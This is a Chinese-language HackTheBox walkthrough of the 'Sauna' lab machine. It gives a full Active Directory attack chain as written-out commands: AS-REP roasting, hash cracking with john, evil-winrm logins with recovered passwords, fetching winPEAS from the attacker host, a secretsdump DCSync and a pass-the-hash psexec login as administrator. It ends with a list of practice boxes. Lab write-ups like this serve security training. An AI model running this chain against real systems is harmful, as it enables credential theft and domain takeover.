<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/o6L3GTiBQWvjJPLe7DJjoQ)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3ib9TkpSwEb1u9yWPQywRicibrXIAff0HMYU909OCg5ufbCFdQYcqD13qw/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
 https://app.hackthebox.com/machines/Sauna
```

靶场: HackTheBox.com

靶机名称: Sauna

难度: 简单

提示信息:

```
 无
```

目标: user.txt 和 root.txt

实验环境
----

```
 攻击机:Manjaro 10.10.16.4
 
 靶机:10.10.10.175
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
 sudo nmap -p- -T4 -sS 10.10.10.175
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3QWILjtd8qQiaVRHmicnxRp3uENVX0PyZD7bribMZn5FibE10cIBlhuibbDw/640?wx_fmt=png)

```
 sudo nmap -sC -sV -p 80,88,139,445,389,593,636 10.10.10.175 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3lud1vKx1nZQwcxAtf6jp7x9lr7qwGwyz33BA8e3TzGIFhMIlLkDIEQ/640?wx_fmt=png)

从扫描结果中看到 80 端口在 IIS 服务下；主机开启 53、88、389 等端口可以判断出靶机为域控主机；389 端口探测出域名为 EGOTISTICAL-BANK.LOCAL，先来看看 80 端口

Web 渗透
------

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3cxLJUBiayuJX3Aglqt6262oZD7XHiahvw1DnQp45iaf07potGNBibKPOJg/640?wx_fmt=png)

访问后发现有多个链接，需要逐一查看

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3yt49iaeic7fjztdcDpSib4598mhzjOFdwe2GqRVaH0gyRENoLcNr03cbA/640?wx_fmt=png)

查看页面后发现均为静态页面，但是在 about.html 页面中发现团队成员的名字，可以收集做为用户账号

按照账号命名规范和名字缩写简单组合起来

```
 vim user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3AQsgQ0icoUntSMyuHKU38cDzEkrDE4CNfsj3dQQ5jm9PbNOU1ILfLMQ/640?wx_fmt=png)

做个目录扫描

```
 dirsearch -u http://10.10.10.175 -t 10
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3qNlpPgG4NE3K1GvEasusnPeGHobASG6WnhqjY4BsydJicCucKibZHS6g/640?wx_fmt=png)

目录扫描同时检测下其他端口（目录扫描未发现敏感信息）

smbmap 使用空账号获取共享目录（未能获取到共享目录）

```
 smbmap -H 10.10.10.175 -u '' -p ''
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3erIpCvmyuYRlXBsmSic1b9zQQ4NZCuFEZ7QapMZAxmqheVTV6IDj6hA/640?wx_fmt=png)

rpcclient 空账号登录（同样失败）

```
 rpcclient 10.10.10.175 -U ""
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3wvHUic2qQevCTR5yHBiarcU7fKtDK4ehsRwGeNqa8aBS5KGu5q8Va7ibg/640?wx_fmt=png)

域渗透
---

尝试获取 “不要求 Kerberos 预身份验证” 的 Hash 值

```
 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt -dc-ip 10.10.10.175
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3qzJtuh9eCrKAu017FbLEbMIxP0KuvOtBAibynNZ7lSQYvlYmJn4TOeQ/640?wx_fmt=png)

拿到 FSmith 账号的密码 Hash，尝试暴破

```
 john fsmith_hash.txt -w=../../Dict/rockyou.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3s1CKkvWRaGEzVps4AlwWmSdnLmKACHKsYzWP6q6Zg3ibDYTibR7m2WiaA/640?wx_fmt=png)

暴破到 FSmith 的密码为 Thestrokes23，尝试登录

```
 evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3t2rdTxxjk3q8n3SYyicwecg1nGLHNwnnMGURwuyFVJyvEthIZg1srEA/640?wx_fmt=png)

登录成功，收集信息

```
 cd ../Desktop
 ls
 type root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3ibQwrXvGwMFh23kLIHnVV8B3wwdnCJdzkHFtSEhGSic5ia8YU8pos8sUA/640?wx_fmt=png)

在用户桌面上拿到 user.txt 中的 flag，继续收集

上传辅助提权工具

1。攻击机在辅助提权工具目录下开启 HTTP 服务

```
 py3 -m http.server
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD32L7OyNxuXuxcxib2jUF3AwVdjPElkQXCsNypyzLFUTyJ1PxPI3bHvfQ/640?wx_fmt=png)

2。靶机下载 winPEASx64.exe

```
 cd \
 mkdir tmp
 cd tmp
 wget http://10.10.16.3:8000/winPEASx64.exe -o wp.exe
 ./wp.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3AObr1pZaL3K7YhN6VRVQzPdbGibgldDmc3HmRemdmoFgvEqGia84qSPQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3wdG1Eib7oEISJlF3UwjnzqKRTJuIvD2NFIrWVgurq35HHIrrxa0SAzw/640?wx_fmt=png)

发现自动登录凭证中的账号密码，然而在用户列表中并未发现此用户账号，有一个较为相似的账号 svc_loanmgr

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD39TjoM11bXZrVcsX44eLYAoia6Xg0cQfmRVhbflmhkn6fiaxbnjIBfCxg/640?wx_fmt=png)

发现两个账号 HSmith 与 svc_loanmgr，查看 svc_loanmgr 用户信息

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3LC0XhEQvW4vkXcib8zDQYVRibuoEK8EiaKqmvs2OX25Yg60ntqXdX0xzw/640?wx_fmt=png)

发现 svc_loanmgr 同样有远程登录权限，尝试使用密码 Moneymakestheworldgoround! 登录

```
 evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3klJ34grAhiar8edVUoXvibFAMKr3H4h6FuoJIdgSlO15KzzN2GPL65vw/640?wx_fmt=png)

登录成功，但是并未发现有何特殊权限和敏感信息

### 转存用户密码 Hash

通过 Impacket 中的 secretsdump.py 脚本提取 Hash

```
 secretsdump.py EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23@10.10.10.175
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3JoqPzzvGqoVdALMxMGmRKeZHSwQ26uYJ7svTwibcAgdxxibdTnQQAMNw/640?wx_fmt=png)

转存失败，更换另一个账号

```
 secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround\\!@10.10.10.175
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD39cRyZlIdjoiamWV7vRQg0tVDicHzzFKcYGiakibaWiaMyIJQ9azN6xRAq2A/640?wx_fmt=png)

提取到 administrator 管理员密码 Hash（由于感叹号导致后面的参数无法执行添加双 \ 来转义，后面试了一下也可以用引号将全部参数包起来）

使用 Impacket 中的 psexec.py 登录靶机

```
 psexec.py administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3DpLExsJsc80pWYnpxIBVsIoGicAAsibfluuRVibX5dFGpZ2gSUg7yZWOw/640?wx_fmt=png)

登录成功，来找下 flag

```
 cd c:\users\administrator
 tree /f
 type desktop\root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3Ln6BOCAC6CqykQ89UF5JzQUh2zXtxoJhiasNjVy1ZnOUfyaAiaib8ESaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3eXXWTlcjribEzuRgfqZlSKOAqycB9UOSYfZopD23efpuFYfDTzrRoSA/640?wx_fmt=png)

拿到 root.txt，游戏结束

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3fXfcOr5W9G7GnNH6pyqO3xJk16jibj91HNCkAiau4YfyMrichfjmLcAzQ/640?wx_fmt=png)

剧透：从第 121 台靶机开始，我将重点打 HTB 上的 OSCP 类的靶机，前期靶机较简单不喜欢的可略过，下面是靶机列表先打 windows 之后再来复习 linux

<table width="1140"><thead><tr cid="n89" mdtype="table_row"><th>Linux Boxes:</th><th>Windows Boxes:</th></tr></thead><tbody><tr cid="n92" mdtype="table_row"><td>Lame</td><td>legacy</td></tr><tr cid="n95" mdtype="table_row"><td>brainfuck</td><td>Blue</td></tr><tr cid="n98" mdtype="table_row"><td>shocker</td><td>Devel</td></tr><tr cid="n101" mdtype="table_row"><td>bashed</td><td>Optimum</td></tr><tr cid="n104" mdtype="table_row"><td>nibbles</td><td>Bastard</td></tr><tr cid="n107" mdtype="table_row"><td>beep</td><td>granny</td></tr><tr cid="n110" mdtype="table_row"><td>cronos</td><td>Arctic</td></tr><tr cid="n113" mdtype="table_row"><td>nineveh</td><td>grandpa</td></tr><tr cid="n116" mdtype="table_row"><td>sense</td><td>silo</td></tr><tr cid="n119" mdtype="table_row"><td>solidstate</td><td>bounty</td></tr><tr cid="n122" mdtype="table_row"><td>node</td><td>jerry</td></tr><tr cid="n125" mdtype="table_row"><td>valentine</td><td>conceal</td></tr><tr cid="n128" mdtype="table_row"><td>poison</td><td>chatterbox</td></tr><tr cid="n131" mdtype="table_row"><td>sunday</td><td>Forest</td></tr><tr cid="n134" mdtype="table_row"><td>tartarsauce</td><td>BankRobber</td></tr><tr cid="n137" mdtype="table_row"><td>Irked</td><td>secnotes</td></tr><tr cid="n140" mdtype="table_row"><td>Friendzone</td><td>Bastion</td></tr><tr cid="n143" mdtype="table_row"><td>Swagshop</td><td>Buff</td></tr><tr cid="n146" mdtype="table_row"><td>Networked</td><td>Servmon</td></tr><tr cid="n149" mdtype="table_row"><td>jarvis</td><td>Active</td></tr><tr cid="n152" mdtype="table_row"><td>Mirai</td><td>Remote</td></tr><tr cid="n155" mdtype="table_row"><td>Popcorn</td><td>Fuse</td></tr><tr cid="n158" mdtype="table_row"><td>Haircut</td><td>Omni</td></tr><tr cid="n161" mdtype="table_row"><td>Blocky</td><td>Worker</td></tr><tr cid="n164" mdtype="table_row"><td>Frolic</td><td>Love</td></tr><tr cid="n167" mdtype="table_row"><td>Postman</td><td>Intelligence</td></tr><tr cid="n170" mdtype="table_row"><td>Mango</td><td>APT</td></tr><tr cid="n173" mdtype="table_row"><td>Traverxec</td><td>Object</td></tr><tr cid="n176" mdtype="table_row"><td>OpenAdmin</td><td>Support</td></tr><tr cid="n179" mdtype="table_row"><td>Magic</td><td><br></td></tr><tr cid="n182" mdtype="table_row"><td>Admirer</td><td><br></td></tr><tr cid="n185" mdtype="table_row"><td>Blunder</td><td><br></td></tr><tr cid="n188" mdtype="table_row"><td>Tabby</td><td><br></td></tr><tr cid="n191" mdtype="table_row"><td>Doctor</td><td><br></td></tr><tr cid="n194" mdtype="table_row"><td>SneakyMailer</td><td><br></td></tr><tr cid="n197" mdtype="table_row"><td>Passage</td><td><br></td></tr><tr cid="n200" mdtype="table_row"><td>Luanne</td><td><br></td></tr><tr cid="n203" mdtype="table_row"><td>Time</td><td><br></td></tr><tr cid="n206" mdtype="table_row"><td>Ready</td><td><br></td></tr><tr cid="n209" mdtype="table_row"><td>Delivery</td><td><br></td></tr><tr cid="n212" mdtype="table_row"><td>Ophiuchi</td><td><br></td></tr><tr cid="n215" mdtype="table_row"><td>ScriptKiddie</td><td><br></td></tr><tr cid="n218" mdtype="table_row"><td>Armageddon</td><td><br></td></tr><tr cid="n221" mdtype="table_row"><td>Knife</td><td><br></td></tr><tr cid="n224" mdtype="table_row"><td>Pit</td><td><br></td></tr><tr cid="n227" mdtype="table_row"><td>Seal</td><td><br></td></tr><tr cid="n230" mdtype="table_row"><td>Previse</td><td><br></td></tr><tr cid="n233" mdtype="table_row"><td>Forge</td><td><br></td></tr><tr cid="n236" mdtype="table_row"><td>Horizontall</td><td><br></td></tr><tr cid="n239" mdtype="table_row"><td>Shibboleth</td><td><br></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3a3JsSp9RPHia1rE2XYWTiaTJkawt6Vt8Vkz2O9icQ4INIKn1UPjGoYg2g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUsuCAgNnXNYTlLhx5glWJD3KPibX09ZewNGQ2ZpXCJQUEj24uDVeuCCWtrPh9sXMUqiaTHVMRXsUSPw/640?wx_fmt=jpeg)